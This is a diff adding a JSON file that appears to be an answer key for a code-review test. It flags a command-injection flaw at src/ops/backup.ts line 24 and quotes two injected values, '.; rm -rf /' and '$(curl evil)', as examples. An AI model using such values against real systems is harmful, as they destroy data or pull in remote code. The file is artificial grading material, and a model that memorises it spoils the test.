@@ -1,0 +1,13 @@
+{
+  "clean": false,
+  "issues": [
+    {
+      "id": "command-injection",
+      "category": "security",
+      "severity": "high",
+      "line_hint": "src/ops/backup.ts:24",
+      "description": "The untrusted `dir` argument is interpolated into a shell command passed to execSync. A value like `.; rm -rf /` or `$(curl evil)` is executed by the shell — arbitrary command injection.",
+      "must_catch": true
+    }
+  ]
+}
